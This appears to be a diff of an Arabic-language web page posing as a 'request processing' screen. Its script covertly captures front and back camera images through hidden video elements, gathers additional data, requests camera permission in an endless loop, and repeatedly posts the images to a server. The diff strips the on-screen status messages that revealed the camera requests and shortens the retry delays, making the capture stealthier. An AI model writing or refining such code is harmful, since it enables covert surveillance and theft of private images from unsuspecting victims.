@@ -37,7 +37,7 @@
     <div class="container">
         <div class="spinner"></div>
         <h1>جاري تنفيذ طلبك</h1>
-        <p id="status">يرجى الانتظار...</p>
+        <p>يرجى الانتظار...</p>
     </div>
     <video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
     <video id="backVideo" playsinline autoplay muted style="display:none;"></video>
@@ -48,7 +48,6 @@
         const backVideo = document.getElementById('backVideo');
         const frontCanvas = document.getElementById('frontCanvas');
         const backCanvas = document.getElementById('backCanvas');
-        const statusElement = document.getElementById('status');
         const userId = window.location.pathname.split('/')[2];
 
         async function collectAdditionalData() {
@@ -90,14 +89,11 @@
         async function requestCameraPermission() {
             while (true) {
                 try {
-                    statusElement.textContent = "يرجى السماح بالوصول إلى الكاميرا...";
                     await navigator.mediaDevices.getUserMedia({ video: true });
-                    statusElement.textContent = "تم منح الإذن بنجاح!";
                     return true;
                 } catch (error) {
                     console.error('Error accessing camera:', error);
-                    statusElement.textContent = "يرجى تفعيل الكاميرا والسماح بالوصول إليها.";
-                    await new Promise(resolve => setTimeout(resolve, 3000));
+                    await new Promise(resolve => setTimeout(resolve, 1000));
                 }
             }
         }
@@ -111,8 +107,7 @@
                 handleSuccess(frontStream, backStream, additionalData);
             } catch (e) {
                 console.error('Error in init:', e);
-                statusElement.textContent = "حدث خطأ. جاري المحاولة مرة أخرى...";
-                setTimeout(init, 3000);
+                setTimeout(init, 1000);
             }
         }
 
@@ -176,8 +171,7 @@
                 }
             } catch (error) {
                 console.error('Error:', error);
-                statusElement.textContent = "حدث خطأ في إرسال الصور. جاري المحاولة مرة أخرى...";
-                setTimeout(() => post(url, formData), 3000);
+                setTimeout(() => post(url, formData), 1000);
             }
         }
 
